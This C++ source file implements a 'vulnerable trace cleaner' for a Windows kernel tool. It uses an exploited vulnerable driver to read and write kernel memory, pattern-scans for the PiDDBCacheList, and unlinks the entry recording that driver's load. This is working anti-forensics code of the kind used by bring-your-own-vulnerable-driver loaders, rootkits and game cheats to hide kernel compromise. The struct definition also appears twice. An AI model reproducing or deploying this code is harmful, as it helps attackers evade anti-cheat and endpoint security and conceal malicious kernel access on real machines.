#include "vuln_trace_cleaner.hpp"

#include <kernel/k32_context.hpp>
#include <kernel/k32_parser.hpp>

#include <utils/cmn_utils.hpp>

#include <ntdll.hpp>
#include <print>

struct PiDDBCacheEntry {
    LIST_ENTRY List;
    UNICODE_STRING DriverName;
    ULONG TimeDateStamp;
    NTSTATUS LoadStatus;
    LIST_ENTRY Links;
};

VulnTraceCleaner::VulnTraceCleaner(std::shared_ptr<K32Context> k32ctx, std::string_view k32ModuleName)
    : k32ctx(std::move(k32ctx))
    , moduleParser(std::make_unique<K32ModuleParser>(
          this->k32ctx->GetDriver(),
          this->k32ctx->GetK32ModuleAddr(k32ModuleName),
          this->k32ctx->GetK32ModuleSize(k32ModuleName)))
{
}

bool VulnTraceCleaner::Cleanup() const
{
    if (!CleanupPiDDBCacheList()) {
        std::println("[-] Failed to cleanup PiDDBCacheList");
        return false;
    }

    return true;
}

bool VulnTraceCleaner::CleanupPiDDBCacheList() const
{
    static const auto _PiDDBCacheList = moduleParser->FindAbsoluteAddr("\x48\x8D\x15\x00\x00\x00\x00\x48\x8B\x0D\x00\x00\x00\x00\x00\x00\x00\x74", "xxx????xxx???????x", 3, 7);
    if (!_PiDDBCacheList) {
        std::println("[-] _PiDDBCacheList not found");
        return false;
    }

    struct PiDDBCacheEntry {
        LIST_ENTRY List;
        UNICODE_STRING DriverName;
        ULONG TimeDateStamp;
        NTSTATUS LoadStatus;
        LIST_ENTRY Links;
    };

    uintptr_t link = 0;
    k32ctx->GetDriver().ReadMemory(_PiDDBCacheList, &link, sizeof(link));

    while (link != _PiDDBCacheList) {
        PiDDBCacheEntry entry { };
        if (!k32ctx->GetDriver().ReadMemory(link, &entry, sizeof(entry))) {
            std::println("[-] Failed to read entry at 0x{:X}", link);
            return false;
        }

        uintptr_t flink = reinterpret_cast<uintptr_t>(entry.List.Flink);

        if (entry.TimeDateStamp == k32ctx->GetDriver().GetTimeStamp()) {
            uintptr_t blink = reinterpret_cast<uintptr_t>(entry.List.Blink);

            if (!k32ctx->GetDriver().WriteMemory(blink, &flink, sizeof(flink))) {
                std::println("[-] Failed to rewrite node [1]");
                return false;
            }

            if (!k32ctx->GetDriver().WriteMemory(flink + sizeof(uintptr_t), &blink, sizeof(blink))) {
                std::println("[-] Failed to rewrite node [2]");
                return false;
            }

            std::println("[+] Vulnerable driver successfully found and unlinked in _PiDDBCacheList");
        }

        link = flink;
    }

    return true;
}